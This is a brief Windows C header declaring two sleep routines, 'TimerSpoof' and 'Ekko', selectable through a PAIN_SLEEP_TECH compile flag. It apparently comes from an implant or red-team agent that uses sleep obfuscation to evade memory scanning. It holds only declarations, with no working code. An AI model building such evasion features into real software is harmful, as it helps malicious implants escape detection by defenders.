#ifndef SLEEP_H
#define SLEEP_H

#include <windows.h>

// Sleep technique IDs - used with PAIN_SLEEP_TECH compile flag
#define SLEEP_TIMER_SPOOF  0
#define SLEEP_EKKO         1

void Sleep_TimerSpoof( ULONG ms );
void Sleep_Ekko      ( ULONG ms );

#endif // SLEEP_H
